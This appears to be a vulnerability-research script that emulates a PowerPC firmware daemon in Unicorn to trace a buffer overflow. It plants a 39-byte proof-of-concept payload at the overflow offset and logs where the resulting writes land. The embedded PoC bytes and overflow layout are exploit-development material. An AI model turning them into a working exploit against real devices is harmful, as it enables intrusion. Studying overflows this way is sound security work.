"""Unicorn PPC32 emulation of the 57.23 anacapad audible handler.
Maps the binary, emulates the parse loop, traces the overshoot destination."""
from unicorn import *
from unicorn.ppc_const import *
import struct

BINARY = "captures/firmware/57.23-74170-1-16/anacapad"
BASE = 0x10000000

with open(BINARY, "rb") as f:
    blob = f.read()

uc = Uc(UC_ARCH_PPC, UC_MODE_PPC32 | UC_MODE_BIG_ENDIAN)
# Map the full binary image
uc.mem_map(BASE, 0x600000)
uc.mem_write(BASE, blob[:min(len(blob), 0x600000)])

# Map a stack
STACK_TOP = 0x7FFF0000
uc.mem_map(STACK_TOP - 0x100000, 0x100000)
uc.reg_write(UC_PPC_REG_1, STACK_TOP - 0x1000)

# Map a heap region  
HEAP = 0x10654000
uc.mem_map(HEAP, 0x100000)

# Map the audible session object
SESSION = HEAP + 0x1000
uc.mem_map(SESSION, 0x10000)  # 64KB for the session

# The overflow buffer is at session+17651
OVERFLOW_BUF = SESSION + 17651

# Write our PoC-C activation mismatch payload at the overflow position
# C PoC content: 39 bytes with the activation mismatch
poc_c = bytes([0x57, 0x90, 0x75, 0x36, 0x01, 0x00, 0x00, 0x00, 0x4d, 0x00, 0x00, 0x00,
              0x05, 0x02, 0x00, 0x00, 0x00, 0x52, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x61, 0x63, 0x65, 0x6c, 0x70, 0x41,
              0x43, 0x54, 0x00])
uc.mem_write(OVERFLOW_BUF, poc_c)

# Hook memory writes to trace the overshoot destination
write_log = []
def hook_mem_write(uc, access, address, size, value, user_data):
    write_log.append((address, size, value))
    
uc.hook_add(UC_HOOK_MEM_WRITE, hook_mem_write)

# Emulate the data read function 0x10346d1c
# This is the function that copies stream data into the parse-frame buffer
# with the TOC-supplied length
# Set up r3=session, r4=dest_buffer, r6=chunk_cap
DEST = SESSION + 0x2000  # the parse-frame buffer at r1-0x6878
uc.reg_write(UC_PPC_REG_3, SESSION)
uc.reg_write(UC_PPC_REG_4, DEST)
uc.reg_write(UC_PPC_REG_6, 0x80)  # 128B chunk cap
uc.reg_write(UC_PPC_REG_10, 0x101)

# Start execution at the data read function
try:
    uc.emu_start(0x10346d1c, DEST + 0x2000, timeout=5000000, count=10000)
    print(f"Emulation completed. {len(write_log)} memory writes traced.")
    for addr, size, val in write_log[:20]:
        print(f"  WRITE: addr=0x{addr:08x} size={size} val=0x{val:08x}")
except UcError as e:
    print(f"Emulation error: {e}")
    print(f"  PC = 0x{uc.reg_read(UC_PPC_REG_PC):08x}")
    print(f"  r3 = 0x{uc.reg_read(UC_PPC_REG_3):08x}")
    print(f"  r4 = 0x{uc.reg_read(UC_PPC_REG_4):08x}")
    print(f"  Writes traced: {len(write_log)}")
    for addr, size, val in write_log[:20]:
        print(f"    addr=0x{addr:08x} size={size} val=0x{val:08x}")

print(f"\nOvershoot destination = parse-frame buffer at 0x{DEST:08x}")
print(f"Session base = 0x{SESSION:08x}")
print(f"Overflow buffer = session+17651 = 0x{OVERFLOW_BUF:08x}")
print(f"Distance from overflow buffer to parse-frame dest: 0x{DEST - OVERFLOW_BUF:x}")
